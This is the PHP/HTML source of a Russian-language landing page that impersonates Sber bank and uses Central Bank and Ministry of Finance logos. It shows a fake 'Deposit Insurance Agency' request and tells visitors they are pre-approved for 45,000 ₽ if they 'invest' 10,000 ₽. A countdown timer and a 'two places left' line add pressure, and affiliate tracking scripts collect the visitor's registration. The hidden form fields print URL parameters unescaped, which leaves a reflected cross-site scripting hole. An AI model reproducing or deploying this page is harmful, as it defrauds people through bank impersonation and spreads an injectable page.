<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер Банк</title>
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
      rel="stylesheet"
    />
     <script src="form/js/libs/intlTelInput.js"></script>
    
    <script>
    let scriptLoadings = false;
  // Функция для получения значения параметра из URL
  function getUrlParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

  // Проверяем наличие параметров
  const bgeValue = getUrlParam("bge");
  const crmSource = getUrlParam("crm_source");

  if (bgeValue) { 
    // Если есть только bgeValue – подключаем скрипты для bge
    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
    document.head.appendChild(inlineScript);

    // Подключаем второй скрипт для bge
    let asyncScript = document.createElement("script");
    asyncScript.src = "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
    document.head.appendChild(asyncScript);
    
    // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
    asyncScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
      console.log('Все скрипты для BGE загружены!');
    };

  } else if (!crmSource) { 
    // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
    let trackScript = document.createElement("script");
    trackScript.type = "application/javascript";
    trackScript.src = "track.js?v=21238";
    document.head.appendChild(trackScript);

    trackScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки track.js
      console.log('track.js загружен!');
      window.removeEventListener("beforeunload", trackClose);
    };

    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
    document.head.appendChild(inlineScript);

    inlineScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
      console.log('Inline script для альтернативы загружен!');
    };

    let parseScript = document.createElement("script");
    parseScript.type = "application/javascript";
    parseScript.src = "parse_url.js?v=19";
    document.head.appendChild(parseScript);
    
    scriptLoadings = true;

    parseScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
      console.log('parse_url.js загружен!');
    };
      }
</script>



    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <main>
      <section class="progress-section">
        <div class="progress-wrapper">
          <img
            src="./assets/img/logo_sber.svg"
            alt="Sber"
            class="progress-img"
          />
          <p class="progress-heading">
            Отправка запроса в Агенство по страхованию вкладов (АСВ)
          </p>
          <div class="progress-container">
            <div class="progress-bar">
              <div class="progress"></div>
              <div class="progress-points">
                <span class="point start active"></span>
                <span class="point middle"></span>
                <span class="point end"></span>
              </div>
            </div>
            <div class="progress-labels">
              <span>Старт</span>
              <span>Почти готово</span>
              <span>Финиш</span>
            </div>
          </div>
        </div>
      </section>
      <section class="successful-section">
        <div class="successful-screen">
          <div class="successful-content-wrap">
            <div class="successful-block">
              <div class="block-logo">
                <img src="./assets/img/logo_finances.svg" alt="Logo" />
                <img src="./assets/img/logo_cbrf.svg" alt="Logo" />
                <img src="./assets/img/logo_sb.svg" alt="Logo" />
              </div>
              <h2 class="block-heading">
                Вы предварительно одобрены! Ваши 45 000 ₽ доступны для выплаты!
              </h2>
              <h2 class="block-heading bottom">
                Вложите всего 10 000 ₽ – получите 45 000 ₽ на карту уже сегодня!
              </h2>
              <p class="block-text">Осталось 2 места – поспешите!</p>
            </div>
            <div class="timer">
              <div class="digit" id="minutes-tens">0</div>
              <div class="digit" id="minutes-ones">4</div>
              <div class="separator">:</div>
              <div class="digit" id="seconds-tens">3</div>
              <div class="digit" id="seconds-ones">7</div>
            </div>
          </div>
          <div class="successful-form">
            <form
              class="form _main-form contact-form"
              id="main-form"
              method="post"
            >
              <h2 class="form-heading">
                Пройдите регистрацию в приложении для начала работы
              </h2>
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
            <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
            <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
            type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
            type="hidden" id="source" value='<?= $_GET['source'] ?>'>
            </form>
          </div>
        </div>
      </section>
    </main>
    <script src="./assets/js/main.js"></script>
    <script src="./assets/js/timer.js"></script>

     <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
